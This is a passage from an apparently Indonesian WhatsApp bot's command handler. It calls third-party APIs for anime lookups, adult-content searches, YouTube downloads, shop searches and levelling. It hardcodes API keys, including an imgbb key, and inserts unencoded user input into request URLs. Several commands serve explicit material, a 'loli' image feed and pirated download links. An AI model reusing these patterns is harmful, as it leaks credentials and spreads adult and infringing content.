             } catch (e) {
             console.log(e)
             freply(String(e))
}
             break
       case 'nhentai':
              if (!isRegist) return freply(mess.regist)
              if (!isDewasa) return freply(mess.dewasa)
              if (isBanned) return freply(mess.banned)
              if (!isPremium) return freply(mess.only.premium)
              if (args.length == 0) return freply(`Example: ${prefix + command} 344253`)
              freply(mess.wait)
              henid = args[0]
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${lolhumanapi}`)
              get_result = get_result.result
              ini_txt = `Title Romaji : ${get_result.title_romaji}\n`
              ini_txt += `Title Native : ${get_result.title_native}\n`
              ini_txt += `Read Online : ${get_result.read}\n`
              get_info = get_result.info
              ini_txt += `Parodies : ${get_info.parodies}\n`
              ini_txt += `Character : ${get_info.characters.join(", ")}\n`
              ini_txt += `Tags : ${get_info.tags.join(", ")}\n`
              ini_txt += `Artist : ${get_info.artists}\n`
              ini_txt += `Group : ${get_info.groups}\n`
              ini_txt += `Languager : ${get_info.languages.join(", ")}\n`
              ini_txt += `Categories : ${get_info.categories}\n`
              ini_txt += `Pages : ${get_info.pages}\n`
              ini_txt += `Uploaded : ${get_info.uploaded}\n`
              freply(ini_txt)
              break
       case 'manga':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!isDewasa) return freply(mess.dewasa)
              if (args.length == 0) return freply(`Example: ${prefix + command} Gotoubun No Hanayome`)
              freply(mess.wait)
              query = args.join(" ")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/manga?apikey=${lolhumanapi}&query=${query}`)
              get_result = get_result.result
              ini_txt = `Id : ${get_result.id}\n`
              ini_txt += `Id MAL : ${get_result.idMal}\n`
              ini_txt += `Title : ${get_result.title.romaji}\n`
              ini_txt += `English : ${get_result.title.english}\n`
              ini_txt += `Native : ${get_result.title.native}\n`
              ini_txt += `Format : ${get_result.format}\n`
              ini_txt += `Chapters : ${get_result.chapters}\n`
              ini_txt += `Volume : ${get_result.volumes}\n`
              ini_txt += `Status : ${get_result.status}\n`
              ini_txt += `Source : ${get_result.source}\n`
              ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
              ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
              ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
              ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
              ini_txt += `Score : ${get_result.averageScore}%\n`
              ini_txt += `Characters : \n`
              ini_character = get_result.characters.nodes
              for (var x of ini_character) {
              ini_txt += `- ${x.name.full} (${x.name.native})\n`
}
              ini_txt += `\nDescription : ${get_result.description}`
              thumbnail = await getBuffer(get_result.coverImage.large)
              await Ramdani.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
              break
       case 'doujindesu':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
             if (!q) return freply(mess.wrongFormat)
             freply(mess.wait)
             try {
             doujinnya = await got.get(`http://api-melodicxt-2.herokuapp.com/api/doujindesu/search?query=${q}&apiKey=administrator`).json()
             let { data } = await doujinnya
             xixixai = `*Doujindesu Search*\n`
             for (let i = 0; i < data.length; i++) {
             xixixai += `\n*Urutan ${i+1}*\n*Title:* ${data[i].title}\n*Type:* ${data[i].type}\n*Status:* ${data[i].status}\n*Rating:* ${data[i].rating}\n*Followers:* ${data[i].followers}\n`
}
             buffer = await getBuffer(data[0].thumb)
             Ramdani.sendMessage(from, buffer, image, {caption: xixixai, quoted: mek})
             } catch (e) {
             console.log(e)
             freply(String(e))
}
             break
      case 'anime':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
             if (args.length == 0) return freply(`Example: ${prefix + command} Gotoubun No Hanayome`)
             freply(mess.wait)
             query = args.join(" ")
             get_result = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=${lolhumanapi}&query=${query}`)
             get_result = get_result.result
             ini_txt = `Id : ${get_result.id}\n`
             ini_txt += `Id MAL : ${get_result.idMal}\n`
             ini_txt += `Title : ${get_result.title.romaji}\n`
             ini_txt += `English : ${get_result.title.english}\n`
             ini_txt += `Native : ${get_result.title.native}\n`
             ini_txt += `Format : ${get_result.format}\n`
             ini_txt += `Episodes : ${get_result.episodes}\n`
             ini_txt += `Duration : ${get_result.duration} mins.\n`
             ini_txt += `Status : ${get_result.status}\n`
             ini_txt += `Season : ${get_result.season}\n`
             ini_txt += `Season Year : ${get_result.seasonYear}\n`
             ini_txt += `Source : ${get_result.source}\n`
             ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
             ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
             ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
             ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
             ini_txt += `Score : ${get_result.averageScore}%\n`
             ini_txt += `Characters : \n`
             ini_character = get_result.characters.nodes
             for (var x of ini_character) {
             ini_txt += `- ${x.name.full} (${x.name.native})\n`
 }
             ini_txt += `\nDescription : ${get_result.description}`
             thumbnail = await getBuffer(get_result.coverImage.large)
             await Ramdani.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
             break
      case 'kusonime':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
             if (args.length == 0) return freply(`Example: ${prefix + command} Gotoubun No Hanayome`)
             freply(mess.wait)
             query = args.join(" ")
             get_result = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch?apikey=${lolhumanapi}&query=${query}`)
             get_result = get_result.result
             ini_txt = `Title : ${get_result.title}\n`
             ini_txt += `Japanese : ${get_result.japanese}\n`
             ini_txt += `Genre : ${get_result.genre}\n`
             ini_txt += `Seasons : ${get_result.seasons}\n`
             ini_txt += `Producers : ${get_result.producers}\n`
             ini_txt += `Type : ${get_result.type}\n`
             ini_txt += `Status : ${get_result.status}\n`
             ini_txt += `Total Episode : ${get_result.total_episode}\n`
             ini_txt += `Score : ${get_result.score}\n`
             ini_txt += `Duration : ${get_result.duration}\n`
             ini_txt += `Released On : ${get_result.released_on}\n`
             ini_txt += `Desc : ${get_result.desc}\n`
             link_dl = get_result.link_dl
             for (var x in link_dl) {
             ini_txt += `\n${x}\n`
             for (var y in link_dl[x]) {
             ini_txt += `${y} - ${link_dl[x][y]}\n`
}
}
             ini_buffer = await getBuffer(get_result.thumbnail)
             await Ramdani.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
             break
       case 'otakudesu':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (args.length == 0) return freply(`Example: ${prefix + command} Gotoubun No Hanayome`)
              freply(mess.wait)
              query = args.join(" ")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=${lolhumanapi}&query=${query}`)
              get_result = get_result.result
              ini_txt = `Title : ${get_result.title}\n`
              ini_txt += `Japanese : ${get_result.japanese}\n`
              ini_txt += `Judul : ${get_result.judul}\n`
              ini_txt += `Type : ${get_result.type}\n`
              ini_txt += `Episode : ${get_result.episodes}\n`
              ini_txt += `Aired : ${get_result.aired}\n`
              ini_txt += `Producers : ${get_result.producers}\n`
              ini_txt += `Genre : ${get_result.genres}\n`
              ini_txt += `Duration : ${get_result.duration}\n`
              ini_txt += `Studios : ${get_result.status}\n`
              ini_txt += `Rating : ${get_result.rating}\n`
              ini_txt += `Credit : ${get_result.credit}\n`
              get_link = get_result.link_dl
              for (var x in get_link) {
              ini_txt += `\n\n*${get_link[x].title}*\n`
              for (var y in get_link[x].link_dl) {
              ini_info = get_link[x].link_dl[y]
              ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
              ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
              ini_txt += `\`\`\`Link : \`\`\`\n`
              down_link = ini_info.link_dl
              for (var z in down_link) {
              ini_txt += `${z} - ${down_link[z]}\n`
}
}
}
              freply(ini_txt)
              break
       case 'nekopoi':
              if (!isRegist) return freply(mess.regist)
              if (!isDewasa) return freply(mess.dewasa)
              if (isBanned) return freply(mess.banned)
              if (args.length == 0) return freply(`Example: ${prefix + command} https://nekopoi.care/isekai-harem-monogatari-episode-4-subtitle-indonesia/`)
              ini_url = args[0]
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoi?apikey=${lolhumanapi}&url=${ini_url}`)
              get_result = get_result.result
              ini_txt = `\`\`\`• Title : ${get_result.anime}\`\`\`\n`
              ini_txt += `\`\`\`• Porducers : ${get_result.producers}\`\`\`\n`
              ini_txt += `\`\`\`• Duration : ${get_result.duration}\`\`\`\n`
              ini_txt += `\`\`\`• Size : ${get_result.size}\`\`\`\n`
              ini_txt += `\`\`\`• Sinopsis : ${get_result.sinopsis}\`\`\`\n`
              link = get_result.link
              for (var x in link) {
              ini_txt += `\n${link[x].name}\n`
              link_dl = link[x].link
              for (var y in link_dl) {
              ini_txt += `${y} - ${link_dl[y]}\n`
}
}
              ini_buffer = await getBuffer(get_result.thumb)
              await Ramdani.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
              break
       case 'nekopoisearch':
              if (!isRegist) return freply(mess.regist)
              if (!isDewasa) return freply(mess.dewasa)
              if (isBanned) return freply(mess.banned)
              if (args.length == 0) return freply(`Example: ${prefix + command} Isekai Harem`)
              query = args.join(" ")
              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=${lolhumanapi}&query=${query}`)
              get_result = get_result.result
              ini_txt = ""
              for (var x of get_result) {
              ini_txt += `\`\`\`• Title : ${x.title}\`\`\`\n`
              ini_txt += `\`\`\`• Link : ${x.link}\`\`\`\n`
              ini_txt += `\`\`\`• Thumbnail : ${x.thumbnail}\`\`\`\n\n`
}
              freply(ini_txt)
              break
       case 'neko':
       case 'kanna':
       case 'sagiri':
       case 'megumin':
       case 'wallnime':
       if (!isRegist) return freply(mess.regist)
       if (!isDewasa) return freply(mess.dewasa)
       if (isBanned) return freply(mess.banned)
              reply(mess.wait)
              getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolhumanapi}`).then((gambar) => {
              Ramdani.sendMessage(from, gambar, image, { quoted: mek, thumbnail: Buffer.alloc(0) })
})
              break
       
       case 'hentai':
       if (!isRegist) return freply(mess.regist)
       if (!isDewasa) return freply(mess.dewasa)
       if (isBanned) return freply(mess.banned)
              getBuffer(`http://hadi-api.herokuapp.com/api/hentai`).then((gambar) => {
              Ramdani.sendMessage(from, gambar, image, { quoted: mek })
}) 
              break
       case 'storyanime':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              freply(mess.wait)
              anu = await fetchJson(`https://lolhuman.herokuapp.com/api/storynime?apikey=${lolhumanapi}`)
              buffer = await getBuffer(anu.result)
              Ramdani.sendMessage(from, buffer, video, { quoted: mek })
              break
       case 'nekopoi3d':
       case '3dnekopoi':
       case '3dnekopoilast':
              if (!isRegist) return freply(mess.regist)
              if (!isDewasa) return freply(mess.dewasa)
              if (isBanned) return freply(mess.banned)
              freply(mess.wait)
              try {
              bsangee = await axios.get(`https://api.vhtear.com/neko3d&apikey=${vhtearapi}`)
              bsangee2 = bsangee.data
              keluarplay = `*List update 3D JAV*\n`
              for (let i = 0; i < bsangee2.result.length; i++) {
              keluarplay += `\n═════════════════\n\n*Judul* : ${bsangee2.result[i].title}\n*Deskripsi* : ${bsangee2.result[i].description}\n*Link* : ${bsangee2.result[i].url}\n`
}
              freply(keluarplay) 
              } catch (err) {
              console.log(err)
              freply('error!')
}
               break
        case 'nekopoijav':
        case 'javnekopoi':
              if (!isRegist) return freply(mess.regist)
              if (!isDewasa) return freply(mess.dewasa)
              if (isBanned) return freply(mess.banned)
               freply(mess.wait)
               try {
               bsangce = await axios.get(`https://api.vhtear.com/nekojavlist&apikey=${vhtearapi}`)
               bsangce2 = bsangce.data
               keluarplay = `*List update JAV*\n`
               for (let i = 0; i < bsangce2.result.length; i++) {
               keluarplay += `\n═════════════════\n\n*Judul* : ${bsangce2.result[i].title}\n*Serial JAV* : ${bsangce2.result[i].seri}\n*Link* : ${bsangce2.result[i].url}\n`
}
               freply(keluarplay)
               } catch (err) {
               console.log(err)
}
               break
        case 'nekopoicosplay':
        case 'cosplaynekopoi':
              if (!isRegist) return freply(mess.regist)
              if (!isDewasa) return freply(mess.dewasa)
              if (isBanned) return freply(mess.banned)
               try {
               freply(mess.wait)
               bsangbe = await axios.get(`https://api.vhtear.com/nekojavcosplay&apikey=${vhtearapi}`)
               bsangbe2 = bsangbe.data
               keluarplay = `*List update Cosplay JAV*\n`
               for (let i = 0; i < bsangbe2.result.length; i++) {
               keluarplay += `\n═════════════════\n\n*Judul* : ${bsangbe2.result[i].title}\n*Deskripsi* : ${bsangbe2.result[i].detail}\n*Link* : ${bsangbe2.result[i].url}\n`
}
               freply(keluarplay)
               } catch (err) {
               console.log(err)
}
               break
        case 'otakuongoing':              
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
               o = await onGoing()
               console.log(o)
               ot = '*「 Ongoing Otakudesu 」*'
               for (let i = 0; i < o.length; i++) {
               ot += `\n\n*Judul :* ${o[i].judul}\n*Episode :* ${o[i].eps}\n*Eps berikutnya pada hari :* ${o[i].hri}\n*Tanggal :* ${o[i].tgl}\n\n*Image :* ${o[i].thumb}`
}
               buff = await getBuffer(o[0].thumb)
               Ramdani.sendMessage(from, buff, image, {quoted: mek, caption: ot})
               break
//ANIME MENU
            case 'waifu':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
v = await fetchJson(`https://api.waifu.pics/sfw/waifu`)
inifile = sendMediaURL(from, v.url, )
buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}nhentaibot`,buttonText:{displayText:'NHENTAI BOT'},type:1}]
              imageMsg = ( await Ramdani.prepareMessage(from, inifile, 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              Ramdani.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
break
       case 'loli':
       case 'husbu':
       case 'milf':
       case 'cosplay':
       case 'wallml':              
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}nhentaibot`,buttonText:{displayText:'NHENTAI BOT'},type:1}]
              imageMsg = ( await Ramdani.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              Ramdani.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              break
//DOWNLOAD MENU
case 'play':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply('Apa Yang Mau Dicari?')
teks = args.join(' ')
freply(mess.wait)
if (!teks.endsWith("-doc")){
res = await yts(`${teks}`).catch(e => {
freply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
freply(`[ *YOUTUBE PLAY* ]
*Judul :* ${res.all[0].title}
*Link Video :* https://youtu.be/${res.all[0].videoId}
*Link Channel :* ${res.all[0].author.url}

_*Tunggu sebentar, bot sedang mengirim file*_`)
res = await y2mateA(res.all[0].url).catch(e => {
freply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendFileFromUrl(res[0].link, audio, {quoted: mek, mimetype: 'audio/mp4', filename: res[0].output})
}
if (teks.endsWith("-doc")){
const tec = teks.split("-doc")
res = await yts(`${tec}`).catch(e => {
freply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
freply(`[ *YOUTUBE PLAY* ]
*Judul :* ${res.all[0].title}
*Link Video :* https://youtu.be/${res.all[0].videoId}
*Link Channel :* ${res.all[0].author.url}

_*Tunggu sebentar, bot sedang mengirim file*_`)
sendFileFromUrl(res.all[0].image, image, {quoted: mek, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
freply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendFileFromUrl(res[0].link, document, {quoted: mek, mimetype: 'audio/mp3', filename: res[0].output})
}
break
case 'play2':
if(isBanned) return freply(mess.banned)
if (args.length === 0) return freply(`Example ${prefix + command} love nwantiti`)
anu = await fetchJson (`https://hardianto.xyz/api/download/play?query=${args.join(" ")}&apikey=hardianto`)
sayang = `TITLE BERHASIL DImekATKAN OLEH BOT\n\nTitle : ${anu.title}\nChannel : ${anu.channel}\nUpload : ${anu.published}\nViews : ${anu.views}\n\n*Mohon Tunggu Beberapa Menit Bot Sedang Mengirimkan File*`
buf = await getBuffer (anu.thumb)
Ramdani.sendMessage (from, buf, image, {quoted: mek, caption: sayang})
sound = await getBuffer (anu.url)
Ramdani.sendMessage(from, sound, audio, {mimetype: 'audio/mp4', quoted: mek})
break
case 'play3':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length ==0)return freply('Judul Lagunya Apa?')
freply(mess.wait)
ini = await fetchJson(`https://hardianto.xyz/api/download/play?query=${args.join(" ")}&apikey=hardianto`)
thmb = await getBuffer(ini.result.thumbnail)
ply1 =`Judul: ${ini.result.title}\nSize: ${ini.result.size}\nDurasi: ${ini.result.duration}`
ply2 =`Silahkan Pilih Media Di Bawah ini`
but = [
{ buttonId: `${prefix}mp3 ${args.join(" ")}`, buttonText: { displayText: '️ᴍᴜsɪᴋ 🎵' }, type: 1 },
{ buttonId: `${prefix}mp4 ${args.join(" ")}`, buttonText: { displayText: 'ᴠɪᴅᴇᴏ 📽️' }, type: 1 }
]
sendButLocation(from, ply1, ply2, thmb, but)
break
case 'mp4':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
freply(mess.wait)
ini = await fetchJson(`https://api.zeks.me/api/ytplaymp4?apikey=apivinz&q=${args.join(" ")}`)
mp4 = await getBuffer(ini.result.url_video)
Ramdani.sendMessage(from, mp4, video)
break
case 'mp3':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
freply(mess.wait)
ini = await fetchJson(`https://api.zeks.me/api/ytplaymp3?apikey=apivinz&q=${args.join(" ")}`)
mp3 = await getBuffer(ini.result.url_audio)
Ramdani.sendMessage(from, mp3, audio)
break
          case 'lirik':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
               if (!q) return freply(mess.wrongFormat)
               freply(mess.wait)
               lirikLagu(q).then((res) => {
               let lirik = `Lirik Lagu ${q}

               ${res[0].result}
`
               freply(lirik)
})
               break
        case 'pinterest':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (args.length == 0) return freply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    ini_url = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/download/pinterest?q=${query}&apikey=${ramdaniapi}`)
                    ini_url = ini_url.result
                    ini_buffer = await getBuffer(ini_url)
                    await Ramdani.sendMessage(from, ini_buffer, image, { quoted: mek })
                    break      
        case 'shopee':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
               try {
               if (args.length == 0) return freply(`Kirim perintah *${prefix}shopee [ query ]*\nContoh : ${prefix}shopee sepatu`)
               query = args.join(" ")
               freply(mess.wait)
               get_data = await fetchJson(`https://api.zeks.xyz/api/shopee?apikey=${zeksapi}&q=${query}`)
               get_data = get_data.data
               teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *SHOPEE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*\n`
for(let i = 0; i < get_data.length; i++) {
teks += `\`\`\`• Nama : ${get_data[i].name}\`\`\`
\`\`\`• Harga : ${get_data[i].harga}\`\`\`
\`\`\`• Terjual : ${get_data[i].terjual}\`\`\`
\`\`\`• Lokasi : ${get_data[i].location}\`\`\`
\`\`\`• Deskripsi*: ${get_data[i].desc}\`\`\`
\`\`\`• Stok : ${get_data[i].stock}\`\`\`
\`\`\`• Informasi : ${get_data[i].information}\`\`\`
\`\`\`• Link : ${get_data[i].url}\`\`\``
}
              ini_buffer = await getBuffer(get_data[0].img_detail[0])
              Ramdani.sendMessage(from, ini_buffer, image, { quoted: mek, caption: teks })
              } catch {
              freply(`Maaf produk ${query} tidak ditemukan`)
}
              break
       case 'playstore':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              try {
              if (args.length == 0) return freply(`Kirim perintah *${prefix}playstore [ apk ]*\nContoh : ${prefix}playstore pubg`)
              query = args.join(" ")
              freply(mess.wait)
              get_result = await fetchJson(`https://api.zeks.xyz/api/sgplay?apikey=${zeksapi}&q=${query}`)
              get_result = get_result.result
              teks = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *PLAYSTORE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*\n`
for(let i = 0; i < get_result.length; i++) {
teks += `\`\`\`• Title : ${get_result[i].title}\`\`\`
\`\`\`• Harga : ${get_result[i].price}\`\`\`
\`\`\`• Rate : ${get_result[i].rating}\`\`\`
\`\`\`• Link : ${get_result[i].url}\`\`\`

`
}
              ini_buffer = await getBuffer(get_result[0].thumb)
              Ramdani.sendMessage(from, ini_buffer, image, { quoted: mek, caption: teks })
              } catch {
              freply(`Maaf aplikasi ${query} tidak ditemukan`)
}
              break
        case 'yts':
       case 'ytsearch':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!q) return reply(mess.wrongFormat)
              reply(mess.wait)
              try {
              res = await yts(q)
              a = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE SEARCH*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*\n`
for (let i of res.all) {
a += `\`\`\`• Title : ${i.title}\`\`\`
\`\`\`• Views : ${i.views}\`\`\`
\`\`\`• Upload : ${i.ago}\`\`\`
\`\`\`• Durasi : ${i.timestamp}\`\`\`
\`\`\`• Channel : ${i.author.name}\`\`\`
\`\`\`• Link : ${i.url}\`\`\``
}
               b = a.trim()
               sendFileFromUrl(res.all[0].image, image, {quoted: mek, caption: b})
               } catch (e) {
               console.log(e)
               reply(`${e}`)
}
               break
       case 'tourl':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
               if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
               freply(mess.wait)
               boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
               owgi = await Ramdani.downloadMediaMessage(boij)
               res = await uploadImages(owgi)
               freply(res)
               } else {
               freply('kirim/reply gambar/video')
}
               break
       case 'imgtourl':
       case 'img2url':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
               freply(mess.wait) 
               var imgbb = require('imgbb-uploader')
               var encmedia  = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
               var media = await  Ramdani.downloadAndSaveMediaMessage(encmedia)       
               imgbb('39d895963468b814fad0514bd28787e2', media)
              .then(data => {
               var caps = `*_IMAGE TO URL_*\n\n*~>  ID :* ${data.id}\n*~>  MimeType :* ${data.image.mime}\n*~>  Extension :* ${data.image.extension}\n*~>  URL :* ${data.display_url}`
               ibb = fs.readFileSync(media)
               Ramdani.sendMessage(from, ibb, image, { quoted: mek, caption: caps})
})
              .catch(err => {
               throw err
})
               break
         case 'asupan':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
               freply(mess.wait)
               asupan()
              .then(async (body) => {
               asupann = body.split('\n')
               asupanx = asupann[Math.floor(Math.random() * asupann.length)]
               sendMediaURL(from, `http://sansekai.my.id/ptl_repost/${asupanx}`, '\`\`\`ASUPAN BRO GUA DAPAT DARI RAMDANI OFFICIAL\`\`\`')
               console.log('Success sending video!')
})
              .catch(async (err) => {
               console.log(err)
               freply(`${err}`)
})
               break              
        case 'nulis':
        case 'tulis':
               if (!isRegist) return freply(mess.regist)
               if (isBanned) return freply(mess.banned)
               if (args.length < 1) return freply('Yang mau di tulis apaan?')
               teks = args.join(' ')
               freply(mess.wait)
               nulis = encodeURIComponent(teks)
               res = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)
               if (res.data.error) return freply(res.data.error)
               buff = Buffer.from(res.data.result.split(',')[1], 'base64')
               Ramdani.sendMessage(from, buff, image, {quoted: mek, caption: mess.success}).catch(e => {
               return freply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim File_')
})
               break
//------------------< Level >-------------------
      case 'level': 
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!isGroup) return freply(mess.only.group)
              if (!isLevelingOn) return await freply('Fitur leveling belum diaktifkan!')
              let userLevel = level.getLevelingLevel(sender, _level)
              let userXp = level.getLevelingXp(sender, _level)
              let requiredXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
              let userRank = level.getUserRank(sender, _level)
              try {
              profilePic = await Ramdani.getProfilePicture(sender)
              } catch {
              profilePic = errorImg
}
              buffer = await getBuffer(`https://lolhuman.herokuapp.com/api/rank?apikey=${lolhumanapi}&img=${profilePic}&background=https://telegra.ph/file/443b6600636aed1d94acd.jpg&username=${encodeURI(pushname)}&level=${userLevel}&ranking=${Number(userRank)}&currxp=${userXp}&xpneed=${requiredXp}`)
              teks = `*「 LEVEL 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${userXp} / ${requiredXp}\n➸ *Level :* ${userLevel}\n➸ *Role*: *${role}*\n\n*Note : Kumpulin Xp Jika Ingin Menaikkan Level*`
              Ramdani.sendMessage(from, buffer, image, { caption: teks, quoted: mek})
              break
       case 'leaderboard': //Cek Leaderboard
       case 'leaderboards':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (!isGroup) return freply(mess.only.group)
              if (!isLevelingOn) return await freply('Fitur leveling belum diaktifkan!') 
              const resp = _level
            _level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
              let leaderboard =  '-----[ *LEADERBOARD* ]----\n\n'
              try {
              for (let i = 0; i < 10; i++) {
              var roles = 'Warrior III'
              if (resp[i].level <= 5) {
              roles = 'Warrior II'
              } else if (resp[i].level <= 10) {
              roles = 'Warrior I'
              } else if (resp[i].level <= 15) {
              roles = 'Elite III'
              } else if (resp[i].level <= 20) {
              roles = 'Elite II'
              } else if (resp[i].level <= 25) {
              roles = 'Elite I'
              } else if (resp[i].level <= 30) {
              roles = 'Master III'
              } else if (resp[i].level <= 35) {
              roles = 'Master II'
              } else if (resp[i].level <= 40) {
              roles = 'Master I'
              } else if (resp[i].level <= 45) {
              roles = 'GrandMaster III'
              } else if (resp[i].level <= 50) {
              roles = 'GrandMaster II'
              } else if (resp[i].level <= 55) {
              roles = 'GrandMaster I'
              } else if (resp[i].level <= 60) {
              roles = 'Epic III'
              } else if (resp[i].level <= 65) {
              roles = 'Epic II'
              } else if (resp[i].level <= 70) {
              roles = 'Epic I'
              } else if (resp[i].level <= 75) {
              roles = 'Legend III'
              } else if (resp[i].level <= 80) {
              roles = 'Legend II'
              } else if (resp[i].level <= 85) {
              roles = 'Legend I'
              } else if (resp[i].level <= 90) {
              roles = 'Mythic'
              } else if (resp[i].level <= 95) {
              roles = 'Mythical Glory'
              } else if (resp[i].level >= 100) {
              roles = 'Immortal'
} 

              leaderboard += `➸ ${i + 1}. wa.me/${_level[i].id.replace('@s.whatsapp.net', '')}\n➸ *Xp :* ${_level[i].xp}\n➸ *Level :* ${_level[i].level}\n➸ *Role :* ${roles}\n\n`
}
              freply(leaderboard)
              } catch (err) {
              console.error(err)
              freply('_Perlu setidaknya 10 user yang memiliki level di database!_')
}
              break
//------------------< Stalk >-------------------
      case 'stalkgithub':
      case 'githubstalk':
              if (!isRegist) return freply(mess.regist)
              if (isBanned) return freply(mess.banned)
              if (args.length == 0) return freply(`Example: ${prefix + command} Ramdani-chan02`)
              freply(mess.wait)
              username = args[0]
              ini_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${username}?apikey=${lolhumanapi}`)
              ini_result = ini_result.result
              ini_buffer = await getBuffer(ini_result.avatar)
              ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *GITHUB USER*
